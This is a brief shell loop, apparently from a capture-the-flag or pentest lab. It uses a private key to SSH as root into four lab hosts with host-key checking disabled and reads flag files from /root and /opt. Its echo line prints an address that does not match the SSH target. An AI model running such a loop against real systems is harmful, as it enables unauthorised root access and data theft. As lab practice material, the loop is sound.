for i in $(seq 105 108); do$
  echo "10.10.10.110.$i"$
  ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" \$
    -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" \$
    -i ~/home/kali/Desktop/updog \$
    root@10.10.110.$i "cat /root/flag.txt; echo; cat /opt/flag.txt; echo" 2>/dev/null$
done$
